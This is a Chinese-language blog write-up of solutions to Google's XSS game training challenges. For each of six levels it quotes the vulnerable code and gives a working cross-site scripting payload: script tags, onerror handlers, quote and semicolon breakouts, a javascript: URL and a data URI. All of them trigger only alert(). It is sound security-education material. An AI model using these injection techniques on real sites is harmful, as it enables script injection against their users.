---
title: Google XSS game solutions
tags:
permalink: google-xss-game-solutions
id: 5acda53481f41f000158dc03
updated: '2017-01-21 23:21:08'
date: 2017-01-21 22:55:28
---

這是 Google 推出的 XSS game，很久之前有看到沒有解，今天又看到解了一下，分享一下心得。

網址：https://xss-game.appspot.com

#Level 1
首先可以看到它把 `X-XSS-Protection` 關掉了，接著看到 `level.py` 的第 45 行：

```
message = "Sorry, no results were found for <b>" + query + "</b>."
```

很明顯前面根本沒做 escape，直接丟一個傳統的 payload 就 ok 了：

```
<script>alert()</script>
```

#Level 2
`index.html` 第 30 行：

```
html += "<blockquote>" + posts[i].message + "</blockquote";
```

一樣丟 `<script>alert()</script>` 發現沒用，丟 `<img src="123" onerror=alert()>` 就 ok 了。

#Level 3
這關有點討厭，不過只要插一個 single quote (`'`) 之後大概就知道怎麼解啦 XD

![](/content/images/2017/01/Screen-Shot-2017-01-21-at-11.04.40-PM.png)

Full payload:

```
https://xss-game.appspot.com/level3/frame#3' onerror="alert()"
```

#Level 4
`timer.html` 第 21 行看起來就超可疑的

```
<img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
```

丟 `12345')` 進去之後長這樣

![](/content/images/2017/01/Screen-Shot-2017-01-21-at-11.08.25-PM.png)

不過如果要在後面觸發 `alert()` 的話，前一個 function call 就必須要關閉（`startTimer`），也就是說要有分號 `;`。重點是插進去什麼都沒有，看了一下 hint，插入 %3B 之後就搞定啦

Full payload:

```
https://xss-game.appspot.com/level4/frame?timer=12345')%3Balert('
```

#Level 5
看到 `signup.html` 第 15 行就覺得可疑，看一下後端的 python code 發現 Next 的網址是看 url 參數的。因此直接丟這個就搞定啦

```
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
```

這邊的 trick 是 `javascript:alert(1)` 會被 browser 認定為執行這個 js code 哦

#Level 6
一開始以為是大魔王關卡，結果簡單到爆
看一下題目寫說他會動態 load 這個 js 檔案，那我們就給他一個 [data uri](https://tools.ietf.org/html/rfc2397) 就好了啊你以為我們真的要去自己 host 一個 js file 嗎

Full payload
```
https://xss-game.appspot.com/level6/frame#data:text/plain,alert(1)
```
